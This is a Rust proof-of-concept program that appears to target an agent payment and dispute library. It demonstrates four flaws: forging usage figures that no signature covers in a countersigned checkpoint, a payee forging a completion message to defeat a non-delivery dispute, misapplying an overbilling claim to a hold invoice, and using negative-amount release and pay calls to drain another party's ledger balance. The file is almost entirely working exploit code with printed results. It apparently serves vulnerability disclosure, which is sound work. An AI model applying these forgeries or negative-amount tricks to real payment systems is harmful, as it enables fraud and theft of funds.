use map_core::cbor::Value;
use map_core::envelope::{seal, Body};
use map_core::{msg_type, MsgId};
use map_identity::Keypair;
use map_pay::codec::*;
use map_pay::credit_ledger::{release_auth_bytes, LedgerOperator};
use map_pay::dispute::*;
use map_pay::{Amount, Asset};

const TASK: [u8; 32] = [0xE; 32];
const QID: [u8; 16] = [0x50; 16];
const INV: [u8; 16] = [0x60; 16];
const TS: u64 = 1_780_000_000_000;
fn payer() -> Keypair { Keypair::from_seed([1; 32]) }
fn payee() -> Keypair { Keypair::from_seed([2; 32]) }
fn op() -> Keypair { Keypair::from_seed([4; 32]) }
fn usd(m: i64) -> AssetAmount { AssetAmount { asset: Asset::new("iso4217:USD").unwrap(), amount: Amount::new(-2, m) } }
fn parties() -> Parties { Parties { payer: payer().agent_id(), payee: payee().agent_id(), operator: Some(op().agent_id()) } }
fn item(kp: &Keypair, kind: u64, mt: u16, content: Value, id: u8) -> EvidenceItem {
    let body = Body { version: 0x0100, msg_type: mt, msg_id: MsgId([id; 16]), timestamp_ms: TS, recipient: None, ttl_ms: None, session_id: None, seq: None, content };
    EvidenceItem { kind, bytes: seal(kp, &body, &[]).unwrap(), cb: None }
}
fn anchored(terms: u64, claim: u64) -> (PayDispute, Vec<EvidenceItem>) {
    let q = PayQuote { quote_id: QID, pricing_model: 1, rate_table: vec![(1, usd(3)), (2, usd(5))], total: Some(usd(500)),
        methods: vec![MethodOffer { uri: "pay:credit-ledger".into(), params: vec![] }], expiry_ms: TS + 60_000, terms: Some(terms), ext: None, task_binding: Some(TASK) };
    let qi = item(&payee(), EV_QUOTE, msg_type::PAY_QUOTE, q.to_value(), 0x10);
    let a = PayAgree { quote_id: QID, quote_digest: pay_ref_digest(&qi.bytes), method: "pay:credit-ledger".into(), authorized_cap: Some(usd(500)) };
    let ai = item(&payer(), EV_AGREE, msg_type::PAY_AGREE, a.to_value(), 0x11);
    let d = PayDispute { dispute_id: [0xD; 16], invoice_id: INV, claim, agree_ref: PayAgreeRef { quote_id: QID, digest: pay_ref_digest(&ai.bytes) }, task: Some(TASK), statement: None, timestamp_ms: TS };
    (d, vec![qi, ai])
}
fn cp(usage: Usage) -> CountersignedCheckpoint {
    let root = [0x77; 32];
    let sig = payer().sign(&checkpoint_ack_signing_input(&TASK, 5, &root));
    CountersignedCheckpoint { task: TASK, through_seq: 5, root, usage: Some(usage), countersig: sig }
}
fn inv(amount: AssetAmount, phase: Option<u64>) -> EvidenceItem {
    let i = PayInvoice { invoice_id: INV, quote_id: QID, amount, watermark: None, method_payload: vec![], timestamp_ms: TS, phase };
    item(&payee(), EV_INVOICE, msg_type::PAY_INVOICE, i.to_value(), 0x20)
}
fn vd(d: &PayDispute, c: &[EvidenceItem], r: &[EvidenceItem]) -> Verdict { verify_dispute(d, c, r, &parties(), &DisputeConfig::default()) }

fn main() {
    // PoC 1: checkpoint usage (key 5) is not covered by ANY signature.
    let honest = cp(Usage { tokens_in: 100, tokens_out: 80, ttft_ms: 1, wall_ms: 1 }); // 100*3+80*5 = 700 > invoice 500
    let mut forged = honest.clone();
    forged.usage = Some(Usage { tokens_in: 1, tokens_out: 1, ttft_ms: 1, wall_ms: 1 }); // bills 8
    let (d, anc) = anchored(0, CLAIM_OVERBILLING);
    let mut ev_h = anc.clone(); ev_h.push(EvidenceItem { kind: EV_CHECKPOINT, bytes: honest.to_bytes(), cb: None }); ev_h.push(inv(usd(500), None));
    let mut ev_f = anc.clone(); ev_f.push(EvidenceItem { kind: EV_CHECKPOINT, bytes: forged.to_bytes(), cb: None }); ev_f.push(inv(usd(500), None));
    println!("PoC1 claim3 honest-usage checkpoint : {:?}", vd(&d, &ev_h, &[]));
    println!("PoC1 claim3 usage-edited checkpoint : {:?}  (countersig unchanged)", vd(&d, &ev_f, &[]));

    // PoC 2: claim 0 rebutted by a COMPLETE the payee signs post-hoc (never delivered).
    let (d0, anc0) = anchored(1, CLAIM_NON_DELIVERY);
    let rcpt = PayReceipt { invoice_id: INV, amount: usd(500), timestamp_ms: TS, proof_digest: None, kind: None };
    let mut cl = anc0.clone(); cl.push(item(&payee(), EV_RECEIPT, msg_type::PAY_RECEIPT, rcpt.to_value(), 0x21));
    let c = map_tasks::msg::Complete { task: map_tasks::TaskId(TASK), outcome: 0, transcript_root: [0; 32],
        usage: map_tasks::msg::Usage { tokens_in: 0, tokens_out: 0, ttft_ms: 0, wall_ms: 0 }, ext: None };
    let fake_complete = item(&payee(), EV_COMPLETE, msg_type::COMPLETE, c.to_value(), 0x99);
    println!("PoC2 claim0 payee silent            : {:?}", vd(&d0, &cl, &[]));
    println!("PoC2 claim0 payee forges COMPLETE   : {:?}", vd(&d0, &cl, &[fake_complete]));

    // PoC 3: claim 3 vs an escrow HOLD invoice (full quoted total, by design) + any lower countersigned checkpoint.
    let (d3, anc3) = anchored(2, CLAIM_OVERBILLING);
    let mut ev3 = anc3.clone();
    ev3.push(EvidenceItem { kind: EV_CHECKPOINT, bytes: cp(Usage { tokens_in: 10, tokens_out: 20, ttft_ms: 1, wall_ms: 1 }).to_bytes(), cb: None });
    ev3.push(inv(usd(500), Some(PHASE_HOLD)));
    println!("PoC3 claim3 vs conforming hold      : {:?}  (pay 5.2.2 says claim 3 does not apply to 1/2)", vd(&d3, &ev3, &[]));

    // PoC 4: negative-amount release-auth drains the payee on the credit ledger.
    let mut led = LedgerOperator::new(op(), -2);
    let (pa, pe) = (payer().agent_id(), payee().agent_id());
    led.credit(&pa, 500); led.credit(&pe, 1000);
    let hold_id = [0x01; 16]; let rel_id = [0x02; 16];
    led.hold(hold_id, &pa, &pe, &usd(500), TS + 1000, TS).unwrap();
    let neg = usd(-900);
    let sig = payer().sign(&release_auth_bytes(hold_id, rel_id, &neg));
    let r = led.release(rel_id, hold_id, &sig, &neg, TS + 1);
    println!("PoC4 release(-9.00) -> {:?}; payer={} payee={} (start payer=5.00 held, payee=10.00)", r.is_ok(), led.balance(&pa), led.balance(&pe));
    // negative pay(): payer-initiated debit with no payer auth at all
    let mut led2 = LedgerOperator::new(op(), -2); led2.credit(&pe, 1000);
    let r2 = led2.pay([0x03; 16], &pa, &pe, &usd(-700), TS);
    println!("PoC4b pay(-7.00) with payer balance 0 -> {:?}; payer={} payee={}", r2.is_ok(), led2.balance(&pa), led2.balance(&pe));
}
